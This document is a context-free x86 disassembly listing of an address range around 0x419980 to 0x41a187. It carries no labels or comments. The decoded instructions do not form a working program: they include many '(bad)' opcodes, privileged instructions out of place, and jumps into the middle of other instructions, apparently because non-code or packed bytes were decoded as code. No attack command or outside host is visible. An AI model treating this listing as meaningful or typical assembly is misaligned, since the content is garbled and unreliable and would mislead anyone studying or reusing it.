  41997e:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  419985:	test   DWORD PTR [eax+edi*8+0x666300],ebx
  41998c:	jno    0x4199f4
  41998e:	add    eax,DWORD PTR [ebp+0x52]
  419991:	adc    eax,0xffffffa0
  419994:	xchg   DWORD PTR [ecx+0x4800fc01],ecx
  41999a:	test   DWORD PTR [eax],eax
  41999c:	clc    
  41999d:	data16 or al,BYTE PTR [ebp+0x45]
  4199a1:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  4199a8:	rol    BYTE PTR [ebp+0x45],1
  4199ab:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4199b1:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4199b7:	push   ebx
  4199b8:	add    BYTE PTR [ebp+0x0],dl
  4199bb:	push   ecx
  4199bc:	jge    0x4199f1
  4199be:	add    BYTE PTR [esi+0x4],dl
  4199c1:	jne    0x419a28
  4199c3:	mov    edx,0x457200
  4199c8:	jmp    0x41998c
  4199ca:	xor    edi,DWORD PTR [ebx]
  4199cc:	pop    edi
  4199cd:	cvtdq2ps xmm7,xmm0
  4199d0:	ret    0x0
  4199d3:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4199d9:	xor    ecx,DWORD PTR [edi]
  4199db:	add    eax,DWORD PTR [ecx+0x3b]
  4199de:	push   ebx
  4199df:	rdpmc  
  4199e1:	out    0x8d,al
  4199e3:	add    BYTE PTR [eax],cl
  4199e5:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  4199eb:	ret    0x450c
  4199ee:	sbb    al,0x8b
  4199f0:	cmp    eax,esi
  4199f2:	or     cl,al
  4199f4:	or     al,0xc2
  4199f6:	pop    eax
  4199f7:	inc    ebp
  4199f8:	add    ecx,DWORD PTR [edi]
  4199fa:	add    esi,DWORD PTR [ebp+0x39]
  4199fd:	invd   
  4199ff:	jge    0x419a0b
  419a01:	mov    eax,0x478ac0
  419a06:	cli    
  419a07:	xor    esp,ecx
  419a09:	mov    ebx,0x5b8ac0
  419a0e:	ret    0x33
  419a11:	mov    eax,0x833b8b
  419a16:	sub    BYTE PTR [ebx],al
  419a18:	inc    ebp
  419a19:	xor    ax,di
  419a1c:	pushf  
  419a1d:	inc    bh
  419a1f:	mov    esp,esp
  419a21:	hlt    
  419a22:	test   DWORD PTR [ebp-0x8],esi
  419a25:	mov    eax,DWORD PTR [ebp-0x14]
  419a28:	xor    ecx,DWORD PTR [ebx-0x76478864]
  419a2e:	dec    edi
  419a2f:	or     BYTE PTR [eax],al
  419a31:	jne    0x4199bc
  419a33:	mov    esi,esp
  419a35:	call   0x77a825fa
  419a3a:	inc    ebp
  419a3b:	mov    DWORD PTR [eax+0x9c4f0c],edi
  419a41:	add    BYTE PTR [ecx-0x3ffe0717],cl
  419a47:	add    BYTE PTR [esi+0x7d],ah
  419a4a:	inc    ebp
  419a4b:	mov    bx,WORD PTR [ebp+0x8]
  419a4f:	add    DWORD PTR [ebp+0x55],0x30c008b
  419a56:	inc    ebp
  419a57:	mov    bx,di
  419a5a:	lock test BYTE PTR [ecx+0x7000801],bh
  419a61:	jge    0x419a24
  419a63:	mov    ecx,DWORD PTR [ebx-0x630613f0]
  419a69:	cli    
  419a6a:	xor    bl,bh
  419a6c:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  419a72:	test   BYTE PTR [eax],cl
  419a74:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  419a7b:	cmp    ebp,eax
  419a7d:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  419a84:	test   BYTE PTR [ebp+0x1],bh
  419a87:	mov    ebx,0x458a00
  419a8c:	xor    esi,DWORD PTR [ebx]
  419a8e:	add    esp,DWORD PTR [esi-0x77]
  419a91:	pop    ebp
  419a92:	loopne 0x419afa
  419a94:	inc    ebp
  419a95:	clc    
  419a96:	xor    edi,DWORD PTR [ebx]
  419a98:	add    esi,DWORD PTR [edx-0x77]
  419a9b:	data16 fdivr QWORD PTR [ebp-0x49]
  419a9f:	mov    ebx,0xb78afc
  419aa4:	hlt    
  419aa5:	xor    edi,DWORD PTR [esi]
  419aa7:	data16 add BYTE PTR [ebp+0x66],bl
  419aab:	data16 lock clc 
  419aae:	cmp    eax,DWORD PTR ds:[eax]
  419ab1:	ja     0x419b19
  419ab3:	psubq  mm7,QWORD PTR [ebp+0x4]
  419ab7:	ltr    WORD PTR [ebp+0x66]
  419abb:	add    esi,eax
  419abd:	add    di,WORD PTR [ebp+0x2b]
  419ac1:	data16 data16 jge 0x419b42
  419ac5:	mov    ebx,0xe08a8b
  419aca:	jge    0x419aff
  419acc:	data16 data16 xor al,0x5d
  419ad0:	data16 data16 jne 0x419acc
  419ad4:	mov    edi,DWORD PTR [ebx]
  419ad6:	fdiv   QWORD PTR [edx+0x7d]
  419ad9:	data16 data16 jge 0x419b11
  419add:	mov    ebx,0x758a66
  419ae2:	mov    esi,0x667233
  419ae7:	pop    ebp
  419ae8:	or     BYTE PTR [esi+0x0],ah
  419aeb:	clc    
  419aec:	mov    edi,DWORD PTR [ebx]
  419aee:	lock ja 0x419a7c
  419af1:	(bad)  
  419af3:	jge    0x419aec
  419af5:	invd   
  419af7:	pop    ebp
  419af8:	add    BYTE PTR [ebx],al
  419afa:	(bad)  
  419afb:	cmp    di,WORD PTR [ebp+0xf]
  419aff:	data16 sbb bh,BYTE PTR [ebp+0x0]
  419b03:	mov    bx,WORD PTR [ebp-0x10]
  419b07:	pop    bp
  419b09:	fbstp  TBYTE PTR [ebx]
  419b0b:	test   DWORD PTR [ebx],eax
  419b0d:	add    BYTE PTR [ebx],bh
  419b0f:	add    BYTE PTR [esi+0x7d],ah
  419b12:	jge    0x419a9f
  419b14:	data16 in al,dx
  419b16:	pop    ebp
  419b17:	stc    
  419b18:	bsf    ecx,DWORD PTR [ebp+0x6632009c]
  419b1f:	mov    edi,ebx
  419b21:	in     al,dx
  419b22:	test   BYTE PTR [ebp+0x0],bh
  419b25:	mov    eax,DWORD PTR [eax]
  419b27:	call   0xbd3e94b7
  419b2c:	ds pushf 
  419b2e:	add    BYTE PTR [edx],dh
  419b30:	mov    bx,di
  419b33:	call   0x8b4a18c3
  419b38:	add    ebp,esp
  419b3a:	mov    bx,di
  419b3d:	jnp    0x419b65
  419b3f:	mov    DWORD PTR [ebx+0x3e7df808],ecx
  419b45:	mov    eax,DWORD PTR [eax]
  419b47:	call   0x7c3d26b2
  419b4c:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  419b52:	data16 data16 fistp WORD PTR [ebp+0xe]
  419b57:	xor    DWORD PTR [edi-0x48fff7ab],0xfb66f403
  419b61:	fisttp WORD PTR [ecx-0x7401f77b]
  419b67:	(bad)  
  419b68:	cld    
  419b69:	jne    0x419ba9
  419b6b:	xor    eax,DWORD PTR [eax]
  419b6d:	mov    esp,DWORD PTR [esi-0x10]
  419b70:	sti    
  419b71:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  419b78:	data16 adc bl,bh
  419b7b:	push   ebp
  419b7c:	xor    ecx,DWORD PTR es:[ebx+0x3ee4f88b]
  419b83:	mov    WORD PTR [eax],es
  419b85:	pushf  
  419b86:	data16 xor bh,bl
  419b89:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  419b8f:	mov    esp,DWORD PTR [esi-0x14]
  419b92:	fisttp WORD PTR [ebx-0x3748a9f2]
  419b98:	or     al,0x2b
  419b9a:	mov    bh,0xba
  419b9c:	hlt    
  419b9d:	mov    bh,bl
  419b9f:	add    BYTE PTR [ecx-0x7446f3cd],cl
  419ba5:	dec    esi
  419ba6:	or     al,0x0
  419ba8:	mov    edi,DWORD PTR [ebx]
  419baa:	or     BYTE PTR [ebp+0x3b],dh
  419bad:	mov    ecx,DWORD PTR [edi]
  419baf:	fdivr  QWORD PTR [ebx-0x7499ff83]
  419bb5:	xor    al,0xd8
  419bb7:	pop    bp
  419bb9:	lock xor esi,DWORD PTR [ebx]
  419bbc:	lea    esp,[esi+0x1f]
  419bbf:	icebp  
  419bc0:	jb     0x419bc6
  419bc2:	add    al,al
  419bc4:	jge    0x419bd2
  419bc6:	mov    eax,eax
  419bc8:	fsubr  st,st(3)
  419bca:	pop    ebp
  419bcb:	mov    esi,DWORD PTR [ebx]
  419bcd:	in     al,0x8d
  419bcf:	rcr    DWORD PTR [edi],0xc2
  419bd2:	jb     0x419c32
  419bd4:	add    cl,cl
  419bd6:	jge    0x419be4
  419bd8:	mov    edx,DWORD PTR [ebp-0x20]
  419bdb:	in     al,dx
  419bdc:	pop    ebp
  419bdd:	data16 data16 or BYTE PTR [esi+edi*4],bh
  419be2:	cmp    di,WORD PTR [ebp+0x0]
  419be6:	mov    ebp,DWORD PTR [ebx]
  419be8:	fdivr  QWORD PTR [esi+0x668a5d]
  419bee:	cmp    al,0x33
  419bf0:	mov    si,0x4e7d
  419bf4:	mov    eax,DWORD PTR [eax]
  419bf6:	lock inc ebp
  419bf8:	mov    esi,DWORD PTR [esi]
  419bfa:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  419c01:	clc    
  419c02:	(bad)  
  419c03:	cmp    edi,DWORD PTR [ebx]
  419c05:	je     0x419c16
  419c07:	push   ebx
  419c08:	loopne 0x419c19
  419c0a:	dec    ecx
  419c0c:	mov    esp,DWORD PTR [esp+eiz*8-0x33]
  419c10:	icebp  
  419c11:	mov    esi,0x703084d
  419c16:	pcmpgtd mm6,mm1
  419c19:	add    BYTE PTR [ebp+0x66],dh
  419c1c:	jmp    0x419be9
  419c1e:	mov    eax,DWORD PTR [ebx]
  419c20:	lock push ebp
  419c22:	ror    DWORD PTR [ebp-0x2972feb3],1
  419c28:	or     bh,dl
  419c2a:	jb     0x419c2a
  419c2c:	add    BYTE PTR [ebx-0x1a7487b3],cl
  419c32:	loopne 0x419c34
  419c34:	jne    0x419c3a
  419c36:	data16 add BYTE PTR [esi+eiz*2],dh
  419c3a:	mov    ecx,ebx
  419c3c:	data16 ds icebp 
  419c3f:	add    BYTE PTR [esi],bh
  419c41:	data16 add bl,cl
  419c44:	retw   0xf2
  419c48:	ret    0x66
  419c4b:	retf   
  419c4c:	enterw 0x4df1,0x19
  419c51:	pop    edi
  419c52:	jne    0x419bd5
  419c54:	mov    esi,DWORD PTR [esi]
  419c56:	call   0x77b627f7
  419c5b:	xor    ebp,DWORD PTR [ebx]
  419c5d:	lea    esp,[esi+0x48]
  419c60:	repnz in eax,0x3b
  419c63:	add    BYTE PTR [ebp-0x37],dh
  419c66:	xor    edx,DWORD PTR [ebp-0x15]
  419c69:	in     al,dx
  419c6a:	xor    edx,DWORD PTR [esi+0x40]
  419c6d:	mov    DWORD PTR [edi],0x338545fc
  419c73:	clc    
  419c74:	add    esi,DWORD PTR [ecx]
  419c76:	pop    edi
  419c77:	pushf  
  419c78:	pop    ebx
  419c79:	call   0xff429c40
  419c7e:	mov    edi,eax
  419c80:	push   ecx
  419c81:	pop    es
  419c82:	mov    esi,DWORD PTR [edi]
  419c84:	push   esi
  419c85:	inc    edi
  419c86:	add    al,0x70
  419c88:	add    BYTE PTR [ecx+0x66],ah
  419c8b:	(bad)  
  419c8c:	into   
  419c8d:	fs ds int 0x0
  419c91:	mov    ecx,0x7ce0866
  419c96:	ret    0x66
  419c99:	add    bh,al
  419c9b:	add    al,0xfc
  419c9d:	add    BYTE PTR [ebp+0x31c3f866],al
  419ca3:	ds pushf 
  419ca5:	add    BYTE PTR [esi+0x66],ah
  419ca8:	into   
  419ca9:	ret    
  419caa:	pop    ebp
  419cab:	adc    al,0x57
  419cad:	add    BYTE PTR [edi-0x723c409a],dh
  419cb3:	add    edi,edi
  419cb5:	jne    0x419d0c
  419cb7:	lea    edx,[ecx+0x1]
  419cba:	mov    ebx,0xd64ff1
  419cbf:	sar    DWORD PTR [ebx],1
  419cc1:	test   BYTE PTR [ebp+0x38],dh
  419cc4:	mov    DWORD PTR [esp+edi*8-0x76],esp
  419cc8:	push   edi
  419cc9:	xor    BYTE PTR [ebx],0x37
  419ccc:	mov    esi,ebx
  419cce:	xor    eax,DWORD PTR [eax-0x3c738f9a]
  419cd4:	cmp    BYTE PTR [ebp+0x64],al
  419cd7:	pop    ebx
  419cd8:	mov    ebx,0x9c3b36
  419cdd:	je     0x419d0a
  419cdf:	xor    edi,DWORD PTR [ebx+0x668a33]
  419ce5:	mov    WORD PTR [ebx],?
  419ce7:	cmp    BYTE PTR [ebx+0x8b4e64],bh
  419ced:	pop    edi
  419cee:	cmp    ecx,ecx
  419cf0:	jne    0x419d47
  419cf2:	mov    ebp,esp
  419cf4:	cld    
  419cf5:	push   esi
  419cf6:	pop    ebx
  419cf7:	inc    ebp
  419cf8:	stc    
  419cf9:	test   DWORD PTR ss:[eax+edi*8-0x317af642],ebx
  419d01:	clc    
  419d02:	test   dl,dl
  419d04:	cmp    bh,bh
  419d06:	fs pop si
  419d09:	or     bl,al
  419d0b:	add    al,0x8b
  419d0d:	add    BYTE PTR [ecx+0x66],dl
  419d10:	push   edi
  419d11:	retf   0x3e45
  419d14:	add    BYTE PTR ss:[esi+eiz*2-0x3d7a3542],bl
  419d1c:	clc    
  419d1d:	add    BYTE PTR [ebx+0x66],bl
  419d20:	dec    edx
  419d22:	mov    edx,DWORD PTR [edi-0x76]
  419d25:	push   edi
  419d26:	add    al,0xb7
  419d28:	xor    al,0xba
  419d2a:	cmp    al,0x8d
  419d2c:	je     0x419d2d
  419d2e:	mov    edx,DWORD PTR [ebp-0x46]
  419d31:	push   ecx
  419d32:	lea    edi,[ebx+0x554fff]
  419d38:	push   ecx
  419d39:	cmp    edx,DWORD PTR [ebx+0x75]
  419d3c:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  419d42:	add    BYTE PTR [ebx],dh
  419d44:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  419d4a:	add    BYTE PTR [ebx+esi*1+0x4f64bb38],cl
  419d51:	mov    ebx,0x3b3b00
  419d56:	jne    0x419d83
  419d58:	mov    DWORD PTR [ebx+0x728afc],edi
  419d5e:	xor    esi,DWORD PTR [ebx]
  419d60:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  419d66:	push   edi
  419d67:	cmp    esp,ebp
  419d69:	jne    0x419d6b
  419d6b:	sbb    DWORD PTR [eax],0x8085c3fc
  419d71:	clc    
  419d72:	inc    edi
  419d73:	pop    ebx
  419d74:	sti    
  419d75:	add    eax,0xeb8bc075
  419d7a:	cld    
  419d7b:	xor    edi,DWORD PTR ds:0xf8c3855e
  419d81:	mov    ecx,DWORD PTR [ecx+edx*2]
  419d84:	rol    DWORD PTR [ebp-0x37],0xf
  419d88:	mov    DWORD PTR [eax],ecx
  419d8a:	inc    edi
  419d8b:	(bad)  
  419d8c:	in     eax,0xfc
  419d8e:	add    bh,bh
  419d90:	(bad)  
  419d91:	mov    esi,0xc38a5e
  419d96:	mov    esi,DWORD PTR [ebx]
  419d98:	push   ecx
  419d99:	mov    edi,0xfc4ec7
  419d9e:	test   DWORD PTR [ebp-0x8],edx
  419da1:	xor    di,ax
  419da4:	pushf  
  419da5:	sub    ebp,eax
  419da7:	inc    ebp
  419da8:	(bad)  
  419da9:	sub    edi,edi
  419dab:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  419db1:	inc    ebp
  419db2:	add    BYTE PTR [esi+0x2b],ah
  419db5:	or     bh,BYTE PTR [edx+0xf8ac2]
  419dbb:	cmp    al,0x33
  419dbd:	mov    edi,DWORD PTR [edx+0xfc4e81]
  419dc3:	(bad)  
  419dc4:	cmp    esi,DWORD PTR [ebx]
  419dc6:	je     0x419d80
  419dc8:	push   ebx
  419dc9:	dec    esi
  419dca:	str    ecx
  419dcd:	cmp    esp,DWORD PTR [ebp+esi*2-0x33]
  419dd1:	xor    edi,DWORD PTR [edi+0x789085f]
  419dd7:	mov    edx,DWORD PTR [esp+edi*8]
  419dda:	add    cl,cl
  419ddc:	data16 add al,0xcb
  419ddf:	push   ebp
  419de0:	add    ebp,esp
  419de2:	jne    0x419dd0
  419de4:	(bad)  
  419de5:	mov    DWORD PTR [ecx],0xd685f7ec
  419deb:	clc    
  419dec:	xlat   BYTE PTR ds:[ebx]
  419ded:	inc    ebp
  419dee:	mov    esi,DWORD PTR [eax]
  419df0:	push   eax
  419df1:	pushf  
  419df2:	in     eax,0x8b
  419df4:	add    ah,ch
  419df6:	add    al,0x55
  419df8:	add    BYTE PTR [ecx+0x66],dl
  419dfb:	add    eax,0x3e72cb
  419e00:	add    BYTE PTR [ebp+0x66],al
  419e03:	(bad)  
  419e04:	retf   
  419e05:	lock ret 0x85
  419e09:	clc    
  419e0a:	inc    bp
  419e0c:	retf   
  419e0d:	cmp    eax,0xc77d9cc8
  419e12:	ss cld 
  419e14:	pushf  
  419e15:	test   DWORD PTR [edi-0x8],ebx
  419e18:	je     0x419e5f
  419e1a:	xor    esi,DWORD PTR ds:0x7020840
  419e20:	ror    BYTE PTR [ebp-0x37],0x8d
  419e24:	push   ebp
  419e25:	add    esp,ebp
  419e27:	jb     0x419db4
  419e29:	add    BYTE PTR [eax],cl
  419e2b:	dec    ebp
  419e2c:	mov    bh,0x81
  419e2e:	push   esi
  419e2f:	push   ebp
  419e30:	adc    DWORD PTR [ecx-0x3c],0x3e9cff81
  419e37:	xor    al,BYTE PTR [eax]
  419e39:	mov    edx,DWORD PTR [edi+0x10]
  419e3c:	(bad)  
  419e3d:	scas   eax,DWORD PTR es:[edi]
  419e3e:	ret    0x3b
  419e41:	jns    0x3b429b34
  419e47:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  419e4b:	dec    ebp
  419e4c:	or     BYTE PTR [ebx],ch
  419e4e:	ret    0x458b
  419e51:	lock jmp 0x419e45
  419e54:	mov    ecx,DWORD PTR [eax]
  419e56:	or     BYTE PTR [edi],al
  419e58:	mov    ecx,eax
  419e5a:	xor    DWORD PTR [edx+0x2],0x0
  419e5e:	mov    bh,0xc1
  419e60:	adc    BYTE PTR [eax],dh
  419e62:	iret   
  419e63:	inc    ebp
  419e64:	mov    DWORD PTR [ebx],0x4dfff8c4
  419e6a:	inc    BYTE PTR [ebx]
  419e6c:	ret    0xf8
  419e6f:	adc    DWORD PTR [esi+0x10],esp
  419e72:	clc    
  419e73:	dec    ecx
  419e74:	fisttp WORD PTR [ecx+0x456604c0]
  419e7a:	add    dh,BYTE PTR ds:0x75e0845
  419e80:	ret    0x4d
  419e83:	lea    ecx,[ebx+0x18728301]
  419e89:	add    BYTE PTR [ebp+0x45],al
  419e8c:	xor    ecx,ebp
  419e8e:	pushf  
  419e8f:	add    bh,al
  419e91:	add    al,ch
  419e93:	inc    ebp
  419e94:	test   DWORD PTR [ebx-0x3eba0708],ecx
  419e9a:	xor    eax,0x781084d
  419e9f:	push   ebp
  419ea0:	pushf  
  419ea1:	push   ecx
  419ea2:	xor    al,BYTE PTR [ecx+0x32f89c89]
  419ea8:	inc    ebp
  419ea9:	cmp    edi,DWORD PTR [ecx]
  419eab:	jbe    0x419e49
  419ead:	mov    eax,edi
  419eaf:	or     ah,dh
  419eb1:	inc    ebp
  419eb2:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  419eb8:	xor    ecx,DWORD PTR [ebx-0x74747664]
  419ebe:	in     al,dx
  419ebf:	hlt    
  419ec0:	push   ebp
  419ec1:	push   ebp
  419ec2:	push   ecx
  419ec3:	push   ecx
  419ec4:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  419eca:	pushf  
  419ecb:	pushf  
  419ecc:	xor    dh,BYTE PTR [edx]
  419ece:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  419ed4:	or     BYTE PTR [ebp+0x7],al
  419ed7:	mov    eax,ecx
  419ed9:	clc    
  419eda:	jb     0x419e9d
  419edc:	add    BYTE PTR [ebp+0x55],cl
  419edf:	or     DWORD PTR [edi],0xc251d155
  419ee5:	add    DWORD PTR [ebx+0x32009c],0x8b76453b
  419eef:	mov    edi,eax
  419ef1:	or     cl,al
  419ef3:	inc    ebp
  419ef4:	dec    ebp
  419ef5:	mov    eax,DWORD PTR [ecx+0x514d550c]
  419efb:	or     WORD PTR [ecx],0x899c
  419f00:	xor    cl,BYTE PTR [ebx+0x5576fc3b]
  419f06:	mov    edx,DWORD PTR [ecx+0x8]
  419f09:	mov    eax,DWORD PTR [ebp-0x8]
  419f0c:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb264]
  419f13:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  419f19:	inc    ebp
  419f1a:	dec    eax
  419f1b:	add    ecx,DWORD PTR [ebx+0x554df0f8]
  419f21:	add    edx,DWORD PTR [ecx-0x8]
  419f24:	mov    ecx,DWORD PTR [ecx]
  419f26:	clc    
  419f27:	or     BYTE PTR [ebp+eax*2+0x4532409c],al
  419f2e:	mov    ecx,ebp
  419f30:	clc    
  419f31:	(bad)  
  419f32:	popf   
  419f33:	inc    DWORD PTR [eax]
  419f35:	ret    0x8b
  419f38:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  419f3e:	mov    edi,esp
  419f40:	hlt    
  419f41:	test   ecx,esi
  419f43:	clc    
  419f44:	or     BYTE PTR [ebp+0x7],al
  419f47:	xor    cl,al
  419f49:	pushf  
  419f4a:	jb     0x419f7f
  419f4c:	add    BYTE PTR [eax-0x3f],al
  419f4f:	inc    eax
  419f50:	daa    
  419f51:	inc    ebp
  419f52:	inc    ebp
  419f53:	xor    eax,0x7f80803
  419f58:	dec    ebp
  419f59:	pushf  
  419f5a:	add    esi,DWORD PTR [edx]
  419f5c:	clc    
  419f5d:	cmp    DWORD PTR [ecx],ecx
  419f5f:	or     al,0x8
  419f61:	add    al,BYTE PTR [ebp+0x2c]
  419f64:	xor    eax,0x7350845
  419f69:	or     BYTE PTR [ebp+0x7],cl
  419f6c:	lea    ebx,[ecx+eax*1+0x8b7232]
  419f73:	or     al,0x45
  419f75:	enter  0x4deb,0x8b
  419f79:	mov    edx,DWORD PTR [eax]
  419f7b:	cld    
  419f7c:	dec    ebp
  419f7d:	push   ebp
  419f7e:	sub    edx,DWORD PTR [ecx-0x75]
  419f81:	add    eax,0xf172fc
  419f86:	or     BYTE PTR [ebp+0x7],cl
  419f89:	add    eax,ecx
  419f8b:	or     al,0x72
  419f8d:	add    DWORD PTR [eax],eax
  419f8f:	mov    ebx,0x29c2c1
  419f94:	inc    ebp
  419f95:	mov    eax,DWORD PTR [ebx]
  419f97:	cmp    eax,0x3004d1c
  419f9d:	xbegin 0x66c72b97
  419fa3:	clc    
  419fa4:	or     BYTE PTR [ebp+0x45],al
  419fa7:	xor    BYTE PTR ds:0x78b089c,dh
  419fad:	adc    BYTE PTR [ebp+0x45],cl
  419fb0:	lea    eax,[ebp+0x33727501]
  419fb6:	add    cl,ch
  419fb8:	inc    ebp
  419fb9:	add    bl,ch
  419fbb:	add    BYTE PTR [ebx+0x45850845],cl
  419fc1:	je     0x419f4e
  419fc3:	push   ebx
  419fc4:	or     al,0x85
  419fc6:	dec    ebp
  419fc7:	std    
  419fc8:	mov    bh,bh
  419fca:	mov    BYTE PTR [ebp-0x75],al
  419fcd:	mov    edi,eax
  419fcf:	or     al,0x89
  419fd1:	inc    ebp
  419fd2:	clc    
  419fd3:	mov    esp,esp
  419fd5:	hlt    
  419fd6:	call   DWORD PTR [edi-0x37]
  419fd9:	push   ebp
  419fda:	or     al,0x51
  419fdc:	push   ebp
  419fdd:	xor    ebp,esp
  419fdf:	mov    esi,0x457251
  419fe4:	xor    esi,eax
  419fe6:	pushf  
  419fe7:	inc    ebp
  419fe8:	(bad)  
  419fe9:	mov    edi,eax
  419feb:	or     al,0x85
  419fed:	add    al,bh
  419fef:	inc    eax
  419ff1:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  419ff5:	or     ah,bh
  419ff7:	inc    eax
  419ff8:	push   ebp
  419ff9:	jmp    0x41a04c
  419ffb:	mov    eax,DWORD PTR ds:0xe8720c
  41a001:	mov    DWORD PTR [ebp-0x8],eax
  41a004:	jne    0x41a04b
  41a006:	jmp    0x419f93
  41a008:	mov    ebp,DWORD PTR [eax]
  41a00a:	clc    
  41a00b:	retf   0xff55
  41a00e:	push   ecx
  41a00f:	mov    DWORD PTR ds:0x757210,eax
  41a015:	mov    ecx,DWORD PTR [ebp-0x4]
  41a018:	sub    esp,DWORD PTR [ebx-0x77]
  41a01b:	dec    DWORD PTR [eax*4-0x74ca8abb]
  41a022:	or     ah,bh
  41a024:	pop    es
  41a025:	ds pushf 
  41a027:	push   DWORD PTR [edx]
  41a029:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  41a02f:	(bad)  
  41a030:	mov    bh,bh
  41a032:	jmp    0x41a020
  41a034:	leave  
  41a035:	jne    0x41a03f
  41a037:	call   0x2e9991
  41a03c:	in     al,dx
  41a03d:	dec    ebp
  41a03e:	add    dh,BYTE PTR [ebx]
  41a040:	add    BYTE PTR [ebx],al
  41a042:	inc    ebp
  41a043:	cmp    esi,DWORD PTR [ecx]
  41a045:	je     0x419fe3
  41a047:	mov    eax,edi
  41a049:	or     al,0xf0
  41a04b:	add    BYTE PTR [ebp+0x458bf845],al
  41a051:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  41a057:	adc    al,0x7
  41a059:	enter  0x9fc0,0xa5
  41a05d:	rol    BYTE PTR [eax],0x5e
  41a060:	mov    ecx,ecx
  41a062:	or     al,0xc
  41a064:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  41a06b:	jmp    0x41a06c
  41a06d:	push   ebp
  41a06e:	mov    esp,ebp
  41a070:	cld    
  41a071:	inc    ebp
  41a072:	inc    ebp
  41a073:	or     DWORD PTR [ecx+0x457dec10],0x0
  41a07a:	push   esi
  41a07b:	push   esi
  41a07c:	mov    edi,0x7af080f
  41a081:	add    bh,al
  41a083:	test   DWORD PTR [edi+ecx*1+0x3a732],ebx
  41a08a:	mov    DWORD PTR [edi],ecx
  41a08c:	adc    BYTE PTR [eax+0x45],al
  41a08f:	mov    ebp,eax
  41a091:	mov    ebp,edi
  41a093:	lock call edx
  41a096:	fcom   DWORD PTR [ebp+0x45]
  41a099:	mov    eax,0x148a8b
  41a09e:	push   ecx
  41a09f:	enter  0xc145,0x83
  41a0a3:	cmp    ecx,DWORD PTR [eax]
  41a0a5:	add    BYTE PTR [ebp+0x4d],al
  41a0a8:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  41a0ae:	call   0xffa19c1d
  41a0b3:	cmp    eax,DWORD PTR [ebp-0xc]
  41a0b6:	jmp    DWORD PTR [eax+edx*1-0x4e]
  41a0ba:	push   ebp
  41a0bb:	(bad)  
  41a0bc:	call   0x329ec0
  41a0c1:	mov    bh,0xdb
  41a0c3:	cld    
  41a0c4:	or     BYTE PTR [ebp+0x45],bl
  41a0c7:	(bad)  
  41a0c8:	call   0xff7b9d58
  41a0cd:	add    al,BYTE PTR [ebp+0x37]
  41a0d0:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  41a0d6:	jne    0x41a0d8
  41a0d8:	(bad)  
  41a0d9:	cmp    edi,esp
  41a0db:	jne    0x41a10e
  41a0dd:	mov    edi,edi
  41a0df:	or     BYTE PTR [ebx-0x307f0b49],cl
  41a0e5:	pop    ds
  41a0e6:	into   
  41a0e7:	je     0x41a0aa
  41a0e9:	mov    ebx,DWORD PTR [esi]
  41a0eb:	or     BYTE PTR [ebp-0x49],al
  41a0ee:	mov    esp,DWORD PTR [esi-0x77]
  41a0f1:	mov    esi,0x4451f0c
  41a0f6:	mov    eax,DWORD PTR [eax]
  41a0f8:	or     al,0x66
  41a0fa:	sar    bl,0x3b
  41a0fd:	xor    esi,DWORD PTR [ebp+0x66]
  41a100:	xor    ecx,edi
  41a102:	pop    edi
  41a103:	adc    bl,BYTE PTR [ebx+0x70]
  41a106:	ret    0xff
  41a109:	cld    
  41a10a:	inc    ebp
  41a10b:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  41a111:	cld    
  41a112:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  41a119:	push   0xffffff83
  41a11b:	pop    edi
  41a11c:	or     BYTE PTR [ebp+0x53],dh
  41a11f:	xorps  xmm1,xmm2
  41a122:	test   BYTE PTR [eax+eax*1],bh
  41a125:	add    BYTE PTR [eax],al
  41a127:	adc    eax,eax
  41a129:	add    DWORD PTR [eax+esi*2-0xff7b00],0xffffffb7
  41a131:	jmp    DWORD PTR [eax]
  41a133:	ror    al,0x5e
  41a136:	inc    ebp
  41a137:	leave  
  41a138:	xor    ecx,DWORD PTR [eax]
  41a13a:	and    DWORD PTR [ebx-0x3ec10708],ecx
  41a140:	add    ah,al
  41a142:	xor    edi,edi
  41a144:	xor    DWORD PTR [ebx],0x66003304
  41a14a:	mov    DWORD PTR [ebp-0xc],ecx
  41a14d:	pcmpgtw mm0,mm0
  41a150:	add    dl,ah
  41a152:	leave  
  41a153:	mov    edi,DWORD PTR [esi-0x7d]
  41a156:	push   ax
  41a158:	dec    ebp
  41a159:	mov    esi,DWORD PTR [ebx-0x75]
  41a15c:	lea    ebp,[eax-0x7c00ff04]
  41a162:	xor    eax,DWORD PTR [eax]
  41a164:	sysret 
  41a166:	dec    ebp
  41a167:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  41a16e:	push   WORD PTR [ecx+0x8]
  41a172:	jne    0x41a135
  41a174:	ud0    ecx,DWORD PTR [ecx]
  41a177:	mov    eax,edx
  41a179:	lods   al,BYTE PTR ds:[esi]
  41a17a:	add    BYTE PTR [eax],al
  41a17c:	data16 (bad) 
  41a17e:	iret   
  41a17f:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  41a186:	cli    
  41a187:	inc    ebp
